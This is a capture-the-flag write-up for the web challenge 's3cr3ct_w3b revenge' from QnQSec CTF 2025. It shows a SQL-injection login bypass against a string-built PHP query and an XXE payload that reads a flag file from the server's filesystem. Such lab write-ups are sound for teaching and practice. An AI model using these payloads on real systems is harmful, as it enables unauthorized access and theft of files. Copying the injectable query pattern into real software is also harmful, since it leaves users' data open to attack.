# s3cr3ct_w3b revenge — QnQSec CTF 2025

> **Room / Challenge:** s3cr3ct_w3b revenge (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** QnQSec CTF 2025
- **Challenge:** s3cr3ct_w3b revenge (web)
- **Target / URL:** `http://161.97.155.116:8088/`
- **Points:** `50`
- **Date:** `20-10-2025`

---

## Goal

We have to get the flag by leveraging XML viewer.

## My Solution

Examine the [source code](./s3cr3ct_w3b_revenge.zip), the source code is written in PHP however examine the Dockerfile, unlike s3cre3ct_web the DockerFile now is different:

```
FROM php:8.2-apache


RUN docker-php-ext-install pdo pdo_mysql

RUN a2enmod rewrite

COPY public/ /var/www/html/
RUN mkdir -p /var/flags && chown www-data:www-data /var/flags
COPY flag.txt /var/flags/flag.txt

WORKDIR /var/www/html/

EXPOSE 80
```

The flag.txt file is copied to `/var/flags/flag.txt` so we cannot access it like the s3cre3ct_web challenge anymore.

First we have to login as admin to use XML functionality, the `/login.php` route use this query:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Easy SQL Injection can be used to logged in:

```
Username: ' OR '1'='1' --
Password: anything
```

After that, we can create an `exploit.xml` to upload that and get the `flag.txt` content in `/var/flags/flag.txt`:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///var/flags/flag.txt">
]>
<r>&xxe;</r>
```
